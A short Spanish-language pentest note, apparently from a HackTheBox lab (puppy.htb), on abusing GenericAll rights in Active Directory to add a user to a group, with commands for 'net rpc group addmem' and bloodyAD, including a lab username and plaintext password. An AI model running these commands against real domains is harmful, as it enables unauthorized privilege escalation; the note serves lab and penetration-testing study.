
Requisitos: 

-  Tener permisos GenericAll

```shell
net rpc group addmem "{GRUPO_DESTINO}" "{USUARIO_A_MOVER}" -U "{NAME_DOMINIO}"/"{USUARIO}"%"{CONTRASEÑA}" -S "{IP_DOMINIO}"
```


### Usando Bloodyad


```shell
bloodyAD --host '10.xx.xx.xx' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
```

